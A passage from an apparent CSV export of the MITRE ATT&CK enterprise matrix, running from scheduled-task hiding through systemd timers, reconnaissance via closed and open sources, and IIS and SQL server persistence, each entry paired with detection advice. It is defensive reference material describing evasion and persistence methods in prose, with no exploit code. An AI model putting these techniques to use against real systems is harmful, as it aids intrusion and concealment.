Adversaries may also create ""hidden"" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",https://attack.mitre.org/techniques/T1053/005,27 November 2019,11 August 2023,enterprise-attack,1.4,"Execution, Persistence, Privilege Escalation","Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\System32\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.

Configure event logging for scheduled task creation and changes by enabling the ""Microsoft-Windows-TaskScheduler/Operational"" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)

* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)

Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",Windows,"Command: Command Execution, File: File Creation, File: File Modification, Network Traffic: Network Traffic Flow, Process: Process Creation, Scheduled Job: Scheduled Job Creation, Windows Registry: Windows Registry Key Creation",True,T1053,,"Andrew Northern, @ex_raritas; Bryan Campbell, @bry_campbell; Selena Larson, @selenalarson; Sittikorn Sangrattanapitak; Zachary Abzug, @ZackDoesML",Administrator,1.0,,,,"(Citation: Cyphort EvilBunny Dec 2014),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Tarrask scheduled task),(Citation: FBI FLASH APT39 September 2020),(Citation: Telefonica Snip3 December 2021),(Citation: Secure List Bad Rabbit),(Citation: SentinelOne Valak June 2020),(Citation: Talos Smoke Loader July 2018),(Citation: CISA SoreFang July 2016),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 OilRig Sept 2018),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: HP SVCReady Jun 2022),(Citation: Accenture Lyceum Targets November 2021),(Citation: Mandiant FIN12 Oct 2021),(Citation: Symantec Shuckworm January 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Zscaler Higaisa 2020),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ESET Carbon Mar 2017),(Citation: Talos Lokibot Jan 2021),(Citation: Palo Alto OilRig Sep 2018),(Citation: SecureWorks August 2019),(Citation: Mandiant APT41),(Citation: Check Point Meteor Aug 2021),(Citation: OilRig New Delivery Oct 2017),(Citation: Group IB GrimAgent July 2021),(Citation: US-CERT TA18-074A),(Citation: Talos Frankenstein June 2019),(Citation: Github PowerShell Empire),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Check Point APT34 April 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Red Canary Qbot),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Volexity SolarWinds),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Sophos Maze VM September 2020),(Citation: ASERT Donot March 2018),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Microsoft Actinium February 2022),(Citation: ESET Lazarus Jun 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: SecureList Griffon May 2019),(Citation: ESET Attor Oct 2019),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye FIN10 June 2017),(Citation: Proofpoint TA2541 February 2022),(Citation: ESET Okrum July 2019),(Citation: Securelist Machete Aug 2014),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: F-Secure Cosmicduke),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: FireEye FIN7 April 2017),(Citation: ESET Crutch December 2020),(Citation: Cybereason Valak May 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Reaqta MuddyWater November 2017),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: BitDefender Chafer May 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Mandiant FIN13 Aug 2022),(Citation: Bitdefender Naikon April 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Cybereason Molerats Dec 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: FireEye Shamoon Nov 2016),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Kaspersky Tomiris Sep 2021),(Citation: ESET Machete July 2019),(Citation: ANSSI RYUK RANSOMWARE),(Citation: Malwarebytes Dyreza November 2015),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Cyberint Qakbot May 2021),(Citation: Symantec Elfin Mar 2019),(Citation: MoustachedBouncer ESET August 2023),(Citation: F-Secure CozyDuke),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Morphisec FIN7 June 2017),(Citation: ESET Sednit July 2015),(Citation: Talos Nyetya June 2017),(Citation: FoxIT Wocao December 2019),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Group IB Cobalt Aug 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cycraft Chimera April 2020),(Citation: ClearSky OilRig Jan 2017),(Citation: ClearSky MuddyWater Nov 2018),(Citation: PowerSploit Documentation),(Citation: CISA Zebrocy Oct 2020),(Citation: ESET OceanLotus Mar 2019),(Citation: Cyberreason Anchor December 2019),(Citation: Trend Micro Qakbot December 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: Cybereason Oceanlotus May 2017),(Citation: Red Canary Dridex Threat Report 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Microsoft Totbrick Oct 2017),(Citation: Juniper IcedID June 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET Gamaredon June 2020),(Citation: Secureworks MCMD July 2019),(Citation: FireEye NETWIRE March 2019),(Citation: Eset Ramsay May 2020),(Citation: Cybereason Bazar July 2020),(Citation: KISA Operation Muzabi),(Citation: Symantec Ukraine Wipers February 2022),(Citation: CrowdStrike Grim Spider May 2019),(Citation: McAfee Dianxun March 2021),(Citation: ESET ComRAT May 2020),(Citation: FireEye FIN6 April 2016),(Citation: Trend Micro Totbrick Oct 2016),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Securelist WhiteBear Aug 2017),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: McAfee Night Dragon),(Citation: Symantec W32.Duqu),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Mandiant No Easy Breach),(Citation: ESET Sednit Part 1),(Citation: CopyKittens Nov 2015),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: NCC Group Chimera January 2021),(Citation: GitHub PowerSploit May 2012),(Citation: FireEye APT34 Dec 2017),(Citation: Symantec Buckeye),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Malwarebytes Higaisa 2020),(Citation: FireEye APT39 Jan 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Unit 42 Valak July 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Symantec Bumblebee June 2022),(Citation: Group IB Ransomware September 2020),(Citation: Volexity Patchwork June 2018),(Citation: Qualys LolZarus),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: CERT-EE Gamaredon January 2021),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Rancor Unit42 June 2018),(Citation: US-CERT Emotet Jul 2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Trend Micro Qakbot May 2020),(Citation: Unit42 Redaman January 2019),(Citation: Crowdstrike Qakbot October 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: ESET Gazer Aug 2017),(Citation: Proofpoint TA505 Jan 2019),(Citation: FireEye APT32 May 2017),(Citation: 360 Machete Sep 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: FireEye TRITON 2019),(Citation: CISA ComRAT Oct 2020),(Citation: ESET RTM Feb 2017),(Citation: S2 Grupo TrickBot June 2017),(Citation: FireEye Operation Double Tap),(Citation: FireEye APT34 July 2019),(Citation: Prevailion DarkWatchman 2021),(Citation: DFIR Phosphorus November 2021),(Citation: ESET InvisiMole June 2020),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Talos GravityRAT),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: RedCanary Mockingbird May 2020),(Citation: Kroll Qakbot June 2020),(Citation: BitDefender BADHATCH Mar 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Securelist Remexi Jan 2019),(Citation: TechNet Schtasks),(Citation: NCC Group Team9 June 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Powersploit),(Citation: TechNet Scheduling Priority),(Citation: TechNet Server Operator Scheduled Task)"
T1053.006,attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21,Scheduled Task/Job: Systemd Timers,"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)

Each <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.

An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.(Citation: Falcon Sandbox smp: 28553b3a9d)",https://attack.mitre.org/techniques/T1053/006,12 October 2020,08 September 2023,enterprise-attack,1.2,"Execution, Persistence, Privilege Escalation","Systemd timer unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>~/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.

Suspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: <code>systemctl list-timers –all</code>. Analyze the contents of corresponding <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.

Audit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers.(Citation: archlinux Systemd Timers Aug 2020)",Linux,"Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation",True,T1053,,"SarathKumar Rajendran, Trimble Inc","root, User",1.0,,,,","
T1597.002,attack-pattern--0a241b6c-7bb2-48f9-98f7-128145b4d27f,Search Closed Sources: Purchase Technical Data,"Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.

Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",https://attack.mitre.org/techniques/T1597/002,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1597,,,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),"
T1597.001,attack-pattern--51e54974-a541-4fb6-a61b-0518e4c6de41,Search Closed Sources: Threat Intel Vendors,"Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)

Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1597/001,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1597,,,,,,,,","
T1596.004,attack-pattern--91177e6d-b616-4a03-ba4b-f3b32f7dda75,Search Open Technical Databases: CDNs,"Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.

Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).",https://attack.mitre.org/techniques/T1596/004,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,","
T1596.001,attack-pattern--17fd695c-b88c-455a-a3d1-43b6cb728532,Search Open Technical Databases: DNS/Passive DNS,"Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.

Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1596/001,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,","
T1596.003,attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca,Search Open Technical Databases: Digital Certificates,"Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.

Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1596/003,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,","
T1596.005,attack-pattern--ec4be82f-940c-4dcb-87fe-2bbdd17c692f,Search Open Technical Databases: Scan Databases,"Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)

Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",https://attack.mitre.org/techniques/T1596/005,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,","
T1596.002,attack-pattern--166de1c6-2814-4fe5-8438-4e80f76b169f,Search Open Technical Databases: WHOIS,"Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)

Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1596/002,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,","
T1593.003,attack-pattern--70910fbd-58dc-4c1c-8c48-814d11fcd022,Search Open Websites/Domains: Code Repositories,"Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  

Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). 

**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories. ",https://attack.mitre.org/techniques/T1593/003,09 August 2022,26 October 2022,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. 

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1593,,"Matt Burrough, @mattburrough, Microsoft; Vinayak Wadhwa, SAFE Security",,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),"
T1593.002,attack-pattern--6e561441-8431-4773-a9b8-ccf28ef6a968,Search Open Websites/Domains: Search Engines,"Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)

Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).",https://attack.mitre.org/techniques/T1593/002,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1593,,,,,,,,"(Citation: KISA Operation Muzabi),"
T1593.001,attack-pattern--bbe5b322-e2af-4a5e-9625-a4e62bf84ed3,Search Open Websites/Domains: Social Media,"Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.

Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",https://attack.mitre.org/techniques/T1593/001,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1593,,,,,,,,"(Citation: ESET Lazarus Jun 2020),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Google EXOTIC LILY March 2022),"
T1505.004,attack-pattern--b46a801b-fd98-491c-a25a-bca25d6e3001,Server Software Component: IIS Components,"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)

Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)

Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)",https://attack.mitre.org/techniques/T1505/004,03 June 2021,17 October 2021,enterprise-attack,1.0,Persistence,"Monitor for creation and/or modification of files (especially DLLs on webservers) that could be abused as malicious ISAPI extensions/filters or IIS modules. Changes to <code>%windir%\system32\inetsrv\config\applicationhost.config</code> could indicate an IIS module installation.(Citation: Microsoft IIS Modules Overview 2007)(Citation: ESET IIS Malware 2021)

Monitor execution and command-line arguments of <code>AppCmd.exe</code>, which may be abused to install malicious IIS modules.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Unit 42 RGDoor Jan 2018)(Citation: ESET IIS Malware 2021)",Windows,"Command: Command Execution, File: File Creation, File: File Modification",True,T1505,,Wes Hurd,"Administrator, SYSTEM",,,,,"(Citation: Unit 42 RGDoor Jan 2018),(Citation: CrowdStrike IceApple May 2022),(Citation: Dell TG-3390),(Citation: ESET IIS Malware 2021),(Citation: McAfee Lazarus Jul 2020),(Citation: Microsoft ISAPICGIRestriction 2016)"
T1505.001,attack-pattern--f9e9365a-9ca2-4d9c-8e7c-050d73d1101a,Server Software Component: SQL Stored Procedures,"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).

Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) 

